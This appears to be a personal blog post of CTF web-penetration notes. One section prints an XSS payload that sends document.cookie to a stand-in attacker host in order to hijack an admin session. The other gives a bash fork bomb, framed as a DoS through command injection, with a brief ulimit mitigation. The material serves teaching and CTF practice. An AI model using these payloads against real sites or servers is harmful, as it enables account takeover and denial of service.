---
layout: post
title:  "XSS notes"
date:   2019-06-15 14:29:25 +0800
categories: infosec
---
> Web penetration writeups

*Due to the on-going nature of the CTF, I will be avoiding keywords related to the problem or hint the answer out of respect for the competition.*

## Cookie Stealing

Basically, there's a page which might be vulnerable to XSS. The goal is to use XSS to change the access level to admin.

Right off the bat, we see that there is a server console on the page. As I opened my *editthiscookie* tool, I saw that there is a user cookie. This hints that we are trying to use XSS to steal the admin cookie as we are given the server address.

> XSS are known to be used to steal cookies. The most common type of attack is to use JavaScript to steal a user's log in cookie (called a session cookie).

Hence, I'll try a script to be run on the page to acess the page.

```javascript
<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />
```

Looking at the console, it seems that they logged the admin cookie. Once I changed my user cookie to the admin's, I instantly got access.

And we're done!

## Fork Bombing

> XSS that hangs the server -> :(){:|:&};:

On sites that allow command injection, a fork bomb is an extremely effective way of performing a DoS attack. The command is nothing but a bash function that gets run recursively.

The gist of a fork bomb is:

```bash
 :() {
   :|:&
 };:
```

We first define a function :, then we call itself (recursion) and pipe the output to the same function with :|: Next, the & puts the function call in the background so the function will not die and will keep eating at system resources. Then, we simply call the function to start the DoS attack.

By setting a ulimit on linux, we can easily prevent the bomb from eating away our resources.